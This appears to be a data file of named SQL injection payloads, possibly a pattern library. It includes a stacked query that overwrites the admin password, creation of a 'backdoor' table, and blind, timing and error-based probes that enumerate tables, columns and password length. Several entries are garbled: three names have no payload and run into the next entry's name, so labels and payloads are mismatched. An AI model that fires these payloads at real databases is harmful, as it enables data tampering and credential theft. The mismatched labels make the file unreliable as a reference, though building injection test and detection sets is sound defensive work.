patterns.name: UNION ALL SELECT with multiple NULLs
Stacked query UPDATE SET attack
patterns.payload: '; UPDATE users SET password='hacked' WHERE username='admin'; --

patterns.name: Second-order UNION injection via stored value
Polyglot sleep injection
patterns.payload: SLEEP(1)/*' or SLEEP(1) or '"  or SLEEP(1) or "*/

patterns.name: Table count discovery
patterns.payload: ' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>10 --

patterns.name: Conditional error-based blind injection
patterns.payload: ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1 --

patterns.name: Backdoor table creation attempt
patterns.payload: '; CREATE TABLE backdoor (id INT, cmd VARCHAR(255)); --

patterns.name: Plus sign space replacement WAF bypass
First table name character discovery
patterns.payload: ' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u' --

patterns.name: Column count discovery
patterns.payload: ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>3 --

patterns.name: Password length discovery via timing
patterns.payload: ' AND (SELECT CASE WHEN (LENGTH(password))>10 THEN SLEEP(5) ELSE 1 END) FROM users WHERE username='admin' --

patterns.name: PostgreSQL conditional cast error
patterns.payload: ' AND (SELECT CASE WHEN (1=1) THEN CAST(version() AS int) ELSE 1 END) --

patterns.name: PostgreSQL information schema enumeration
patterns.payload: ' AND (1)=(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%user%') --

patterns.name: GROUP BY Subquery Injection
patterns.payload: ' GROUP BY (SELECT table_name FROM information_schema.tables LIMIT 1)--
